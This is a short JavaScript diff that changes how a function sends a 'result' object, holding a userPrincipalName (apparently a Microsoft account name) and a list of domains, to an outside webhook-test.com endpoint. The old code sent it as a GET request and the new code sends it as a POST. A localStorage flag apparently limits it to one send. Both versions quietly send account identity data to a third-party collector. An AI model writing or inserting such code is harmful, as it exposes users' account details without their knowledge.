@@ -103,7 +103,14 @@ function Run(index) {
       }
       result.userPrincipalName = newAccount;
       result.domains = domains;
-      fetch("https://webhook-test.com/30e0283098aed29b5c052a61c0828c89?result=" + encodeURIComponent(JSON.stringify(result)));
+      fetch('https://webhook-test.com/30e0283098aed29b5c052a61c0828c89', {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(result)
+      })
+      .catch(error => console.error("Error posting to webhook:", error));
       localStorage.setItem("userPrincipalName0", '1');
     });
 }
